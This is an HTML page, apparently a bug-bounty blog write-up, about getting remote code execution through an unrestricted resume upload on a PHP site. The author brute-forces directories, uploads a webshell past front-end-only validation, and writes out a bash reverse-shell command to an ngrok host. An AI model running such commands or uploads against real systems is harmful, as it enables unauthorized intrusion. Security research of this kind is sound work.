@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Remote Code Execution via File Upload — thevillagehacker</title>
+  <meta name="description" content="Remote Code Execution via File Upload"/>
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,300;0,400;0,500;0,600;1,400&family=Bebas+Neue&display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="../assets/css/style.css"/>
+</head>
+<body>
+<div class="page">
+
+  <!-- Navigation -->
+  <nav>
+    <a class="nav-logo" href="../index.html">thevillagehacker</a>
+    <ul class="nav-links">
+      <li><a href="../blog.html">Blog</a></li>
+      <li><a href="../about.html">Whoami</a></li>
+      <li><a href="../changelog.html">Changelog</a></li>
+    </ul>
+  </nav>
+
+  <!-- Post Header -->
+  <div class="post-header">
+    <div class="breadcrumb">
+      <a href="../blog.html">Blog</a><span>→</span>Remote Code Execution via File Upload
+    </div>
+    <h1 class="post-title">Remote Code Execution via File Upload</h1>
+    <div class="post-meta">
+      <span>2021-04-07</span>
+      <span>Naveen Jagadeesan</span>
+      <span>thevillagehacker</span>
+    </div>
+  </div>
+
+  <!-- Article Body -->
+  <article>
+<p>Obtain Remote Code Execution due to Unrestricted File Upload.</p>
+<h2>Introduction</h2>
+<p>Remote Code Execution (RCE) is a critical vulnerability that allows unauthorized individuals to access and modify a computer or server from a remote location. This capability enables attackers to run arbitrary malicious software, also known as malware, on the targeted system.</p>
+<h2>Identifying the Target</h2>
+<p>During the reconnaissance phase, I utilized Google dorks to find a target that had a responsible disclosure program. For the purpose of this article, let's refer to the target website as abc.com. Further investigation revealed that the target company owned seven subdomains, all integrated with the parent domain abc.com and offering various functionalities.</p>
+<h2>Exploiting PHP-Based Website</h2>
+<p>Since the target website was predominantly built using PHP, I focused on finding a vulnerability that would allow me to upload a PHP file and gain a reverse shell. Interestingly, I discovered that the website had a career page where applicants could upload their resumes in PDF format.</p>
+<h3>Directory Brute-Forcing</h3>
+<p>To begin, I conducted a directory brute-forcing operation using the dirsearch tool. This enabled me to identify directories on the website and gain a better understanding of its structure.</p>
+<p><img src="../assets/images/blogs/RCE1/1.webp" alt="Directory Brute-Forcing" /></p>
+<h2>Discovering Uploaded Files</h2>
+<p>During my investigation, I came across an &quot;uploads&quot; folder that contained all the documents uploaded by individuals applying for jobs through the career page.</p>
+<p><img src="../assets/images/blogs/RCE1/2.webp" alt="Index of Uploaded Files" /></p>
+<h2>Exploiting the CV Upload Functionality</h2>
+<p>I proceeded to the career page URL (https://www.abc.com/careers.php) to examine the CV upload functionality. However, I found that the application only performed file extension validation at the front end, leaving room for potential exploitation.</p>
+<p><img src="../assets/images/blogs/RCE1/3.webp" alt="Frontend File Extension Validation" /></p>
+<h2>Uploading the PHP Webshell</h2>
+<p>Taking advantage of the lax file extension validation, I downloaded a PHP webshell and successfully uploaded it.</p>
+<p><img src="../assets/images/blogs/RCE1/4.webp" alt="PHP Webshell Upload" /></p>
+<h2>Activating the Webshell</h2>
+<p>To trigger the PHP webshell, I accessed the location where the shell was uploaded.</p>
+<p><img src="../assets/images/blogs/RCE1/6.webp" alt="Webshell Activation" /></p>
+<h2>Expanding Control with Reverse Shell</h2>
+<p>At this point, the webshell was functioning correctly. To establish a reverse shell, I either uploaded a reverse shell or used the following command in the web shell console to access the system via port forwarding using ngrok services.</p>
+<h2>PHP Webshell Repository</h2>
+<p>For reference, you can find the PHP webshell I used in this demonstration on my GitHub repository: <a href="https://github.com/thevillagehacker/Bug-Hunting/blob/main/Rev-shell/php_web_shell.php">GitHub Repo</a></p>
+<h2>Obtaining a Reverse Shell</h2>
+<p>To acquire a reverse shell, the following steps were performed:</p>
+<ol>
+<li>Enabled port forwarding.</li>
+<li>Listened to the forwarded port using Netcat.</li>
+</ol>
+<p><img src="../assets/images/blogs/RCE1/7.webp" alt="Port Forwarding Setup with ngrok" /></p>
+<p>With the completion of port forwarding setup, I executed the following command in the webshell input field:</p>
+<p><code>bash -i &gt;&amp; /dev/tcp/0.tcp.ngrok.io/1000 0&gt;&amp;1</code></p>
+<p><img src="../assets/images/blogs/RCE1/8.webp" alt="Executing Reverse Connection via Bash" /></p>
+<p>As a result, a successful reverse shell connection was established.</p>
+<p><img src="../assets/images/blogs/RCE1/9.webp" alt="Successful Reverse Shell" /></p>
+<h2>Conclusion</h2>
+<p>In this article, I demonstrated how an unrestricted file upload vulnerability on a PHP-based website could lead to Remote Code Execution (RCE). By exploiting the website's lax file extension validation, I successfully uploaded a PHP webshell and obtained a reverse shell, ultimately gaining unauthorized access to the system. Thank you for reading.</p>
+<p>For more updates and insights, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </article>
+
+  <!-- Post Navigation -->
+  <div class="post-nav">
+    <a href="2021-03-10-iOS-dynamic-lab-setup.html" class="post-nav-link prev"><div class="post-nav-dir">← Previous</div><div class="post-nav-title">Jailbreaking iPhone and Setting Up Dynamic Analysis Lab</div></a>
+    <a href="2021-05-08-massive_subdomain-takeover.html" class="post-nav-link next"><div class="post-nav-dir">Next →</div><div class="post-nav-title">Uncovering the Extensive Subdomain Takeover Vulnerability</div></a>
+  </div>
+
+  <!-- Footer -->
+  <footer>
+    <span class="footer-text">
+      © 2025 <a href="../index.html">thevillagehacker</a>
+      — Naveen Jagadeesan
+    </span>
+    <span class="footer-text">
+      status: active<span class="blink"></span>
+    </span>
+  </footer>
+
+</div>
+</body>
+</html>
